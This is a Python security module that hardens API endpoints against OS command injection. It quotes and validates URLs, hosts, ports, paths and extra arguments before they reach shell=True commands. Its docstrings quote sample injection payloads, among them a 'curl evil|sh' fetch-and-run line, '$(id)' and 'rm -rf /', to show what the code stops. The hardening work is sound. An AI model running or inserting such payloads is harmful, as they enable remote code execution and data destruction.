"""
command_sanitizer — neutralise OS command injection at the API boundary.

Why this exists
---------------
Every ``/api/tools/*`` endpoint builds a shell command by f-string
interpolation of request parameters, e.g.::

    command = f"sqlmap -u {url} --batch"
    result = execute_command(command)

``execute_command`` ultimately runs the string through
``subprocess.Popen(cmd, shell=True, ...)`` (see
``server_core/enhanced_command_executor.py``).  Because the user-controlled
values are interpolated raw, a value such as ``http://x/;curl evil|sh`` or
``$(id)`` is executed by the shell — i.e. unauthenticated remote command
execution against the host running the platform.

The fix is to escape/validate the *user-controlled* portions of the command
while leaving the static, developer-authored portion (flags, pipes the tool
genuinely needs) untouched.  This module provides the primitives to do that
without changing how commands are executed, so it is a drop-in, non-breaking
hardening layer.

Usage
-----
Single discrete value (URL, host, file path, a single flag value)::

    from server_core.security import quote_arg
    command = f"sqlmap -u {quote_arg(url)} --batch"

Caller-supplied *extra arguments* string (multiple flags meant to be passed
through verbatim)::

    from server_core.security import safe_extra_args
    command += f" {safe_extra_args(additional_args)}"

Typed validators raise :class:`CommandSanitizationError` (a ``ValueError``
subclass) on clearly-malicious input so the endpoint can return HTTP 400::

    from server_core.security import safe_url, CommandSanitizationError
    try:
        url = safe_url(request.json.get("url", ""))
    except CommandSanitizationError as exc:
        return jsonify({"error": str(exc)}), 400
"""

from __future__ import annotations

import ipaddress
import re
import shlex
from typing import Optional, Union

__all__ = [
    "CommandSanitizationError",
    "quote_arg",
    "safe_extra_args",
    "safe_url",
    "safe_host",
    "safe_port",
    "safe_path",
    "safe_token",
]


class CommandSanitizationError(ValueError):
    """Raised when an input cannot be safely used in a shell command."""


# Characters that must never reach a ``shell=True`` command unescaped.  Newlines
# and NUL are always rejected outright (shlex.quote does not make a multi-line
# value safe in every shell context, and NUL truncates C-level argv).
_FORBIDDEN_CONTROL = ("\x00", "\n", "\r")

# Conservative allow-lists for typed validators.
_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([A-Za-z0-9_](?:[A-Za-z0-9_-]{0,62}[A-Za-z0-9_])?)(?:\.[A-Za-z0-9_](?:[A-Za-z0-9_-]{0,62}[A-Za-z0-9_])?)*\.?$")
_TOKEN_RE = re.compile(r"^[A-Za-z0-9._:@/+=-]+$")
_SCHEME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.-]*://")


def _reject_control(value: str, *, field: str = "value") -> None:
    for bad in _FORBIDDEN_CONTROL:
        if bad in value:
            raise CommandSanitizationError(
                f"{field} contains a forbidden control character"
            )


def quote_arg(value: Union[str, int, float, None]) -> str:
    """Return ``value`` as a single, shell-safe token.

    Wraps :func:`shlex.quote`, so ``http://x/;rm -rf /`` becomes the single
    literal argument ``'http://x/;rm -rf /'`` — the shell can no longer
    interpret the metacharacters.  ``None`` becomes an empty quoted string.

    Use for a *single* discrete value (URL, hostname, filename, one flag
    value).  For a string that legitimately contains several flags, use
    :func:`safe_extra_args` instead.
    """
    if value is None:
        return "''"
    text = str(value)
    _reject_control(text, field="argument")
    return shlex.quote(text)


def safe_extra_args(value: Optional[str]) -> str:
    """Sanitise a caller-supplied *extra arguments* string.

    ``additional_args`` parameters are meant to pass several CLI flags through
    verbatim, so they cannot simply be quoted as one token.  Instead we tokenise
    with :func:`shlex.split` (honouring intended quoting) and re-quote every
    token, which preserves multi-flag usage while making shell operators such as
    ``;`` ``|`` ``&&`` ``$()`` inert (they survive only as literal argument
    text, never as shell syntax).

    Returns ``""`` for empty input.  Raises :class:`CommandSanitizationError`
    on unbalanced quotes.
    """
    if not value:
        return ""
    _reject_control(value, field="arguments")
    try:
        tokens = shlex.split(value)
    except ValueError as exc:  # unbalanced quotes, etc.
        raise CommandSanitizationError(f"could not parse arguments: {exc}") from exc
    return " ".join(shlex.quote(tok) for tok in tokens)


def safe_url(value: str, *, field: str = "url") -> str:
    """Validate a URL/target string for safe shell interpolation.

    Rejects control characters and raw shell metacharacters, then returns the
    value shell-quoted.  Intentionally permissive about scheme (tools accept
    bare hosts, ``http(s)``, ``ftp``, etc.) but strict about injection.
    """
    if not isinstance(value, str) or not value.strip():
        raise CommandSanitizationError(f"{field} is required")
    value = value.strip()
    _reject_control(value, field=field)
    # A URL/target should not contain shell command separators.
    if re.search(r"[;&|`$<>(){}\\\s]", value) and not _SCHEME_RE.match(value):
        # Allow scheme'd URLs (which may legitimately contain none of these);
        # bare targets with whitespace/metachars are suspicious.
        raise CommandSanitizationError(f"{field} contains illegal characters")
    if re.search(r"[;&|`$<>\\\n\r]", value):
        raise CommandSanitizationError(f"{field} contains shell metacharacters")
    return quote_arg(value)


def safe_host(value: str, *, field: str = "host") -> str:
    """Validate a hostname or IP address; return it shell-quoted.

    Accepts IPv4/IPv6 literals and RFC-1123-ish hostnames only.
    """
    if not isinstance(value, str) or not value.strip():
        raise CommandSanitizationError(f"{field} is required")
    value = value.strip()
    try:
        ipaddress.ip_address(value)
        return quote_arg(value)
    except ValueError:
        pass
    if not _HOSTNAME_RE.match(value):
        raise CommandSanitizationError(f"{field} is not a valid hostname or IP")
    return quote_arg(value)


def safe_port(value: Union[str, int]) -> str:
    """Validate a TCP/UDP port (1–65535); return it as a string."""
    try:
        port = int(str(value).strip())
    except (TypeError, ValueError):
        raise CommandSanitizationError("port must be an integer")
    if not (0 < port < 65536):
        raise CommandSanitizationError("port must be in 1..65535")
    return str(port)


def safe_path(value: str, *, field: str = "path", allow_absolute: bool = True) -> str:
    """Validate a filesystem path for safe shell interpolation.

    Rejects shell metacharacters and (optionally) absolute paths.  Returns the
    value shell-quoted.  Note: this guards against *injection*, not against
    path traversal — callers that must confine a path to a directory should
    additionally resolve and check it against an allowed root.
    """
    if not isinstance(value, str) or not value.strip():
        raise CommandSanitizationError(f"{field} is required")
    value = value.strip()
    _reject_control(value, field=field)
    if re.search(r"[;&|`$<>(){}*?\n\r]", value):
        raise CommandSanitizationError(f"{field} contains shell metacharacters")
    if not allow_absolute and value.startswith("/"):
        raise CommandSanitizationError(f"{field} must be a relative path")
    return quote_arg(value)


def safe_token(value: str, *, field: str = "token") -> str:
    """Validate a restricted token (no spaces, allow-listed chars only).

    Suitable for identifiers, hashes, usernames, interface names, etc.  Returns
    the raw value (already safe by construction); raises on anything outside the
    allow-list ``[A-Za-z0-9._:@/+=-]``.
    """
    if not isinstance(value, str) or not value.strip():
        raise CommandSanitizationError(f"{field} is required")
    value = value.strip()
    if not _TOKEN_RE.match(value):
        raise CommandSanitizationError(f"{field} contains illegal characters")
    return value
